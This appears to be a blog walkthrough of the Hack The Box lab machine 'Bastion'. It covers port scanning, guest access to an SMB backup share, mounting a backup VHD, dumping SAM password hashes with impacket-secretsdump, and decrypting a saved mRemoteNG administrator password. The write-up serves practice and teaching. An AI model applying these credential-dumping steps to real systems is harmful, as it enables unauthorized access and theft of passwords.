---
layout: post
title: HTB Bastion Walktrhoug
categories: [HTB, OSCP]
---

Lets dig into really nice easy box from HTB. Enumeration was key and really interesting technique to acquire both passwords.

![](/images/bastion-htb/logo.png)

First we did some recon with nmap first

```bash
nmap  -sC -sV -oA nmap/initial 10.10.10.134
Starting Nmap 7.91 ( https://nmap.org ) at 2021-01-31 01:04 EST
Nmap scan report for 10.10.10.134
Host is up (0.14s latency).
Not shown: 996 closed ports
PORT    STATE SERVICE      VERSION
22/tcp  open  ssh          OpenSSH for_Windows_7.9 (protocol 2.0)
| ssh-hostkey: 
|   2048 3a:56:ae:75:3c:78:0e:c8:56:4d:cb:1c:22:bf:45:8a (RSA)
|   256 cc:2e:56:ab:19:97:d5:bb:03:fb:82:cd:63:da:68:01 (ECDSA)
|_  256 93:5f:5d:aa:ca:9f:53:e7:f2:82:e6:64:a8:a3:a0:18 (ED25519)
135/tcp open  msrpc        Microsoft Windows RPC
139/tcp open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp open  microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: -19m57s, deviation: 34m36s, median: 0s
| smb-os-discovery: 
|   OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3)
|   Computer name: Bastion
|   NetBIOS computer name: BASTION\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2021-01-31T07:04:55+01:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2021-01-31T06:04:53
|_  start_date: 2021-01-30T14:27:36

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 21.90 seconds
```

We have few ports open 
* SSH which is unusual for windows box
* 135,445 SMB port
* 139 is RPC

I start looking for SMB share if any is available with smbclient

```bash
smbclient -L //10.10.10.134 -N
        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        Backups         Disk      
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
SMB1 disabled -- no workgroup available
```

I can see there is Backups which is not default. I fire up smbmap to double check permissions on this share.

```bash
smbmap -H 10.10.10.134 -u " " -p " "                
[+] Guest session       IP: 10.10.10.134:445    Name: 10.10.10.134                                      
[|] Work[!] Unable to remove test directory at \\10.10.10.134\Backups\CRGLQMBUJS, please remove manually
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        ADMIN$                                                  NO ACCESS       Remote Admin
        Backups                                                 READ, WRITE
        C$                                                      NO ACCESS       Default share
        IPC$                                                    READ ONLY       Remote IPC
                                                                                            
```

I had Read and Write permissions. After some time of digging i found vhd file which i know is probably some file system maybe backup of this machine. I look for some manual how to mount/access this vdh in kali. I end up on this article which was exactly what i was looking for [link](https://medium.com/@klockw3rk/mounting-vhd-file-on-kali-linux-through-remote-share-f2f9542c1f25)

Basically i needed to install some tool to access shares.

```bash
sudo apt install cifs-utils 
sudo apt install libguestfs-tools
```

Them I create to folders /mnt/media and /mnt/vdh. I mount Backup share to media dn vdh file to vdh folder

```bah
sudo mount -t cifs //10.10.10.134/Backups /mnt/media 
sudo guestmount --add /mnt/media/WindowsImageBackup/L4mpje-PC/Backup\ 2019-02-22\ 124351/9b9cfbc4-369e-11e9-a17c-806e6f6e6963.vhd --inspector --ro /mnt/vdh
```

I start looking for file. Find username of this machine. Because I had access to all files and none of them was protected I can access SAM file which contains passwords.

I use this command from impacket tools
```bash
impacket-secretsdump -sam SAM -security SECURITY -system SYSTEM LOCAL
```

I was clear text for auto login password. As i know username from users folder I tried to get access via SSH and I was in. Tried to use winpeas.exe but i was getting access denied on different folders. I start looking for common files and i noticed mRemoteNg. Start googling and there is an easy password access on Windows box. I look for linux option and find this python [script](https://github.com/haseebT/mRemoteNG-Decrypt). I downloaded config.xml file from victim machine to my kali box. Run script against this file but there was some error issue. Script also have option for pass password value from xml file. That give me password for administrator

```bash
python3 mremoteng_decrypt.py -s aEWNFV5uGcjUHF0uS17QTdT9kVqtKCPeoC0Nw5dmaPFjNQ2kt/zO5xDqE4HdVmHAowVRdC7emf7lWWA10dQKiw==
Password: thXLHM96BeKL0E**
```

I also spin my win box and tried to get admin password.
I copy xml file and downloaded mremote portable version from their websites/
I lunch application and choose *Open Connection File...*

![](/images/bastion-htb/mremote-open.png)

mRemoteNg have ability to work with external tools. I clicked on Tools -> External Tools and add this cmd command.

![](/images/bastion-htb/mremote-cmd.png)

Them just right click on DC connection and external tools -> cmd will give me pop up with current password

![](/images/bastion-htb/mremote-admin.png)


___
Lesson learned..... 

I forgot to run nmap scan on all ports
```bash
nmap -p - -oA nmap/allports 10.10.10.134 
Starting Nmap 7.91 ( https://nmap.org ) at 2021-01-31 01:05 EST
Stats: 0:07:10 elapsed; 0 hosts completed (1 up), 1 undergoing Connect Scan
Connect Scan Timing: About 76.54% done; ETC: 01:15 (0:02:12 remaining)
Nmap scan report for 10.10.10.134
Host is up (0.14s latency).
Not shown: 65522 closed ports
PORT      STATE SERVICE
22/tcp    open  ssh
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
5985/tcp  open  wsman
47001/tcp open  winrm
49664/tcp open  unknown
49665/tcp open  unknown
49666/tcp open  unknown
49667/tcp open  unknown
49668/tcp open  unknown
49669/tcp open  unknown
49670/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 605.68 seconds
```

Tried evil-winrm as L4mpje but access was denied due to authorization. *Always have some recon on background!* and happy learning :)






